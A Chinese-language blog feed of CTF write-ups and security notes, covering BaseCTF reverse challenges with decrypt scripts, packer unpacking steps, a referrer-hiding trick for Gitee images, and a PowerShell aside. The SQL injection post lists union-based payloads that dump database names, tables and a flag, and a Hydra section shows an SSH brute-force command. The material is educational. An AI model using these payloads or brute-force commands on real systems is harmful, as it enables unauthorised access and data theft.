    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>既然是UPX那必须先DIE查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141119212.png" srcset="/img/loading.gif" lazyload><br>一看就不对劲，upx最多只见过3.96的，不过这里先用upx自己脱一下可以脱<br>直接继续查，64位无壳，进入ida<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141122619.png" srcset="/img/loading.gif" lazyload><br>明显的base64直接，解密<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141123562.png" srcset="/img/loading.gif" lazyload><br>秒解<br>BaseCTF{Hav3_@_g0od_t1m3!!!}</p><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><p>简单xor，直接看ida，查位数64位<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141128380.png" srcset="/img/loading.gif" lazyload><br>看码了解，关键函数keystream和encrpt，输入长度为28，str、v11、v12、v13加起来正好28位,这个题目要注意的就是ida中的c是小端序的会所有的数据都会反转，而且记得使用原数据，不要用转义后的容易出错<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141137462.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141138498.png" srcset="/img/loading.gif" lazyload><br>写pythonexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#官方wp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key</span>):<br>    key_box = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>        key_box.append(key[i%<span class="hljs-number">3</span>] ^ i)<br>    <span class="hljs-keyword">return</span> key_box<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc, key</span>):<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    key = key[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        flag += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i])<br>    <span class="hljs-keyword">return</span> flag<br><br>enc1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1D0B2D2625050901&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;673D491E20317A24&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;34056E2E2508504D&quot;</span>)[::-<span class="hljs-number">1</span>]<br>enc4 = <span class="hljs-string">b&quot;\&quot;@;%&quot;</span><br>enc = enc1 + enc2 + enc3 + enc4<br><span class="hljs-built_in">print</span>(enc)<br><br>key = (<span class="hljs-number">7499608</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br>key_box = key_stream(key)<br><span class="hljs-built_in">print</span>(key_box)<br><br>flag = decrypt(enc,key_box)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>以上来就搞个base64啊，我感觉像，但是没有确定，于是就看不懂函数里面的几个值为什么没有数了，这么奇怪，果然还是没有学过，不过这次好好分析了一番下次应该就可以瞬间秒杀了，看题<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141107908.png" srcset="/img/loading.gif" lazyload><br>我们能了解重要函数为Encode，进入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141108814.png" srcset="/img/loading.gif" lazyload><br>了解了这个是base64后我们还要和源代码分析，发现存在不同<br><img src="https://gitee.com/fogpost/photo/raw/master/202409141109133.png" srcset="/img/loading.gif" lazyload><br>了解了这中间有个异或的操作，十分简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">do</span><br>&#123;<br>    *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br>    ++v8;<br>&#125;<br><span class="hljs-keyword">while</span> ( v8 != v5 );<br></code></pre></td></tr></table></figure><p>直接cyberChef换表加异或双重解密完成，<br>贴个无广告的<a href="https://cyberchef.org/">cyberchef</a><br><img src="https://gitee.com/fogpost/photo/raw/master/202409141116043.png" srcset="/img/loading.gif" lazyload><br>得到flag<br>BaseCTF{BA5e_DEcoD1N6_sEcr3t}</p><h3 id="Ezpy"><a href="#Ezpy" class="headerlink" title="Ezpy"></a>Ezpy</h3><p>首先就是按照惯例，文件属性查询，直接die，也可以用DEID或者peexam去查。不过die很全面，但是确实很卡<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151024364.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409151027465.png" srcset="/img/loading.gif" lazyload><br>看题目我们就知道是一个这是一个python题目，其实还有一个办法，pythonexe图标大多都是这个，看DIE竟然没有显示是什么软件打包的，那么我们便可以试试pyinstxtractor<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151029748.png" srcset="/img/loading.gif" lazyload><br>这就是解包过程，和使用方法，在这个过程中pyinstxtractor会自动创建一个导出包，我们可以查看，同时我们也可以发现解包软件对python版本的需求，你有想法的可以用<a href="https://zhuanlan.zhihu.com/p/36402791">pyenv</a>去除掉这个错误，其实我感觉没什么区别，主要在于后面pyc文件中的magic number<br>进入解包文件夹，会发现资源文件夹和大量的动态链接库，我们只取敌将首级，直接看到一个没有后缀的题目同名软件Ezpy<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151035853.png" srcset="/img/loading.gif" lazyload><br>这个其实是pyc也就是python的字节码。我们需要的就是这个，python大部分就是利用pyc来进行反编译，我们所知的反编译工具有<a href="https://www.52pojie.cn/thread-1854345-1-1.html">pycdc</a>(pycdc会有些麻烦，不过感觉强大些，因为是反编译难免会出现错误，而这个的错误出现会更加稀少)和<a href="https://pypi.com.cn/project/uncompyle6/">uncompyle6</a>这个的安装非常的简单，有python就行(但是只支持3.8及一下的，作者大大不更3.9了)<br>好现在我们开始执行一下pycdc(记得改Ezpy后缀名，pycdc就没关系)，就会发现惊喜了，失败了<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151042742.png" srcset="/img/loading.gif" lazyload><br>这个就是我说的magicnumber的问题解决办法也非常简单，一般解包后都会自带一个struct文件。用字节查看器打开推荐<a href="https://www.52pojie.cn/thread-1863194-1-1.html">010</a>，不过大部分都是损坏的我在这贴一个<a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">magicnumber</a>。<br>注意大小端序，照着改就行。建议是十六个字节，留空留下栈区<br><img src="https://gitee.com/fogpost/photo/raw/master/202409151053398.png" srcset="/img/loading.gif" lazyload><br>然后直接反编译(也可以用网络版的)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> Key<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_Sbox</span>(<span class="hljs-params">seed</span>):<br>    k_b = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ <span class="hljs-built_in">ord</span>(seed[i % <span class="hljs-built_in">len</span>(seed)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k_b[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyStream</span>(<span class="hljs-params">text, Sbox</span>):<br>    s = Sbox.copy()<br>    (i, j) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    k = [<br>        <span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(text)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i] = s[j]<br>        s[j] = s[i]<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        k[r] = s[t] ^ Key.keykey[r % <span class="hljs-built_in">len</span>(Key.keykey)]<br>    <span class="hljs-keyword">return</span> k<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">text, seed</span>):<br>    Sbox = init_Sbox(seed)<br>    key = KeyStream(text, Sbox)<br>    enc = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span> = <span class="hljs-literal">None</span>: [ text[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br>enc = <span class="hljs-string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span><br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input Your flag:&#x27;</span>)<br>flag = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: [ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">.0</span> ])(flag)<br>flag = Encrypt(flag, Key.key)<br><span class="hljs-keyword">if</span> flag != enc:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It&#x27;s not flag!&quot;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are right!&#x27;</span>)<br>sys.exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>就是一个非常简单的rc4<br>直接给出exp</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可恶的gitee吃掉外链了</title>
    <link href="/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/"/>
    <url>/2024/09/12/%E5%8F%AF%E6%81%B6%E7%9A%84gitee%E5%90%83%E6%8E%89%E5%A4%96%E9%93%BE%E4%BA%86/</url>
    
    <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>这是这个博客最开始的故事，我想要用gitee做一个图床，当时我怎么也没想到gitee居然拒绝掉外链的请求了，就像这样<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122231370.png" srcset="/img/loading.gif" lazyload><br>但是反复尝试我们发现了一下返回值</p><h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>要实现防盗链，就需要知道图片的请求是从哪里发出的。可以实现这一功能的有请求头中的origin和referer。origin只有在XHR请求中才会带上，所以图片资源只能借助referer</p><p>通过判断请求的referer，如果请求来源不是本站就返回302</p><h4 id="一个完整的流程："><a href="#一个完整的流程：" class="headerlink" title="一个完整的流程："></a>一个完整的流程：</h4><ul><li>首先请求正常的图片，但是没有返回200，而是302重定向，其中响应头中的location就是要重定向去向的地址</li><li>接着浏览器会自动请求这个location，并用这个返回结果代替第一次请求的返回内容<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122241207.png" srcset="/img/loading.gif" lazyload></li></ul><h4 id="如何破解防盗链"><a href="#如何破解防盗链" class="headerlink" title="如何破解防盗链"></a>如何破解防盗链</h4><p>想让gitee不知道我在盗用，就不能让他发现请求的来源是第三方，只要把referer藏起来就好</p><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122236635.png" srcset="/img/loading.gif" lazyload><br>但是我们可以骗过gitee，用butterfly和yilia的主题可以上网搜搜都有讲，fluid这类的不同，但是我们这里要讲下进阶的代码注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122233566.png" srcset="/img/loading.gif" lazyload><br>按上面这个我们就可以写出header头前的代码来注入，骗过gitee使图片显现<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122236132.png" srcset="/img/loading.gif" lazyload><br>下面是我的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;head_begin&#x27;</span>, <span class="hljs-string">&#x27;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#x27;</span>, <span class="hljs-string">&#x27;post&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注解：</p><meta name="referrer" content="no-referrer" /> 指定了 "no-referrer" 的内容，意味着浏览器在发送请求时不会包含任何引用来源信息。换句话说，当用户从当前网页跳转到其他页面时，新页面接收到的请求中将不包含这个跳转前的页面地址<p><a href="https://blog.csdn.net/weixin_52479803/article/details/131774501">参考文章</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSG脱壳过程中的IAT修复</title>
    <link href="/2024/09/12/FSG%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/FSG%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h3 id="MSG脱壳过程中的IAT修复"><a href="#MSG脱壳过程中的IAT修复" class="headerlink" title="MSG脱壳过程中的IAT修复"></a>MSG脱壳过程中的IAT修复</h3><p>进行手动查找和IAT修复<br>找可以在动态连接库中查得到的call<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016001.png"><br>在命令行中敲425210然后查连接库函数<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016599.png"><br>向上向下查找为0的数值(分割处)<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016253.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016865.png"><br>手动修改RVA和size的值<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122016959.png"></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>asp脱壳</title>
    <link href="/2024/09/12/asp%E8%84%B1%E5%A3%B3/"/>
    <url>/2024/09/12/asp%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<p>asp脱壳时利用</p><h4 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h4><p>利用tc命令跟踪<br><img src="http://gitee.com/fogpost/photo/raw/master/image12.png"><br>查找带有sfx和输入表的字段<br><img src="http://gitee.com/fogpost/photo/raw/master/image-1.png"><br>这个方法由于时程序自动进行的所以十分缓慢不建议用  </p><h4 id="SFX法"><a href="#SFX法" class="headerlink" title="SFX法"></a>SFX法</h4><p><img src="http://gitee.com/fogpost/photo/raw/master/image-3.png"><br>自动抵达<br><img src="http://gitee.com/fogpost/photo/raw/master/image-4.png"></p><h3 id="nspack"><a href="#nspack" class="headerlink" title="nspack"></a>nspack</h3><p>巧妙脱壳法<br><img src="http://gitee.com/fogpost/photo/raw/master/image-5.png"><br>at GetVersion  </p><p>下版本断点<br><img src="http://gitee.com/fogpost/photo/raw/master/image-6.png"><br>在retn处下断点<br>单步F8之后到打OEP之后向前找OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122015500.png"></p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>asp 脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEcompact脱壳</title>
    <link href="/2024/09/12/PEcompact/"/>
    <url>/2024/09/12/PEcompact/</url>
    
    <content type="html"><![CDATA[<h3 id="PEcompact脱壳"><a href="#PEcompact脱壳" class="headerlink" title="PEcompact脱壳"></a>PEcompact脱壳</h3><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017434.png"></p><blockquote><p>3<br>BP VirtualFree<br>F9到达取消断点<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017793.png"><br>返回到用户代码alt+f9<br>查找PUSH 8000<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017787.png"><br>然后单步到达<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017628.png"></p></blockquote><blockquote><p>4<br>BP VirtualFree<br>两次shift+f9到达<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017209.png"><br>返回到用户代码alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017851.png"><br>然后单步跟踪到达oep</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017705.png"></p><blockquote><p>5<br>bp 0045DE74<br>运行,到达后取消断点<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018701.png"><br>在retn处会返回并执行程序我们现在下面下个断点，然后单步到OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018935.png"><br>这一段汇编比较重要注意在retn后面加上断点</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018816.png"></p><blockquote><p>6<br>bp VirtualAlloc<br>shift+f9,取消断点,返回用户代码alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018918.png"><br>查找jump<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018029.png"><br>单步到OEP</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018091.png"></p><blockquote><p>7  取消异常<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018128.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png"><br>利用shift+f9,两次过后发现跑飞，利用第二次的SE句柄地址，（如果发现单词就跑飞了那是应为吾爱破解od中的插件strongod的过在option中将skip some Exception取消就行）<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019809.png"><br>查找句柄<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019805.png"></p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122019946.png"></p><blockquote><p>8  两次内存<br>注意对比跳跃代码<br>9  at Getversion<br>到达OEP的下方</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sql注入初识</title>
    <link href="/2024/09/12/sql%E5%88%9D%E8%AF%95/"/>
    <url>/2024/09/12/sql%E5%88%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Sql注入初识"><a href="#Sql注入初识" class="headerlink" title="Sql注入初识"></a>Sql注入初识</h1><p>&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png"><br>以nssctf题为例<br>首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>确定几列之后便可以用语句查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png"><br>便可以了解第二列和第三列的类型<br>然后输入一下语句，查询数据库名称，以及库中有什么表，<br>并查询两张表中的字段，发现flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png"><br>最后从表中查询flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工具使用说明书</title>
    <link href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="工具使用说明书"><a href="#工具使用说明书" class="headerlink" title="工具使用说明书"></a>工具使用说明书</h1><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra -l root -p root 127.0.0.1 -s 2111 ssh -f<br>-l： LOGIN      指定破解的用户，对特定用户破解。<br>-L：FILE     指定用户名字典。<br>-p：PASS ，指定密码破解，少用，一般是采用密码字典。<br>-P： FILE   指定密码字典文件<br>-s： PORT 指定爆破端口<br>-M：FILE    指定目标列表文件<br>-C： FILE   使用冒号分割格式，例如“登录名 : 密码”来代替-L&#x2F;-P参数。<br>-f：  在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</p><blockquote><p>ps:我们可以利用hydra -h来查看帮助</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hydra</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脚本命令和普通命令的区别</title>
    <link href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/"/>
    <url>/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<h3 id="脚本命令和普通命令的区别"><a href="#脚本命令和普通命令的区别" class="headerlink" title="脚本命令和普通命令的区别"></a>脚本命令和普通命令的区别</h3><blockquote><p>在我们将windows系统调成可以执行脚本命令之后我们的许多命令在cmd或ise中可能无法执行这可能是因为命名的原因   </p></blockquote><p>开启脚本执行之前</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\agesh&gt; where calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><p>开启之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\data\code&gt; where calc<br>PS C:\data\code&gt;<br></code></pre></td></tr></table></figure><p>解决办法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where.exe calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where  [cc lang=&quot;powershell&quot;]<br>cmdlet Where-Object at command pipeline position 1<br>Supply values for the following parameters:<br>Property:<br></code></pre></td></tr></table></figure><blockquote><p>所以在写入where calc时执行的其实是where-object cacl这是没有返回值的，不是执行where.exe calc<br>但是在非脚本名模式下不会识别位where-object于是可以正常执行</p></blockquote><p><a href="https://www.codenong.com/16775686/">相关链接</a></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
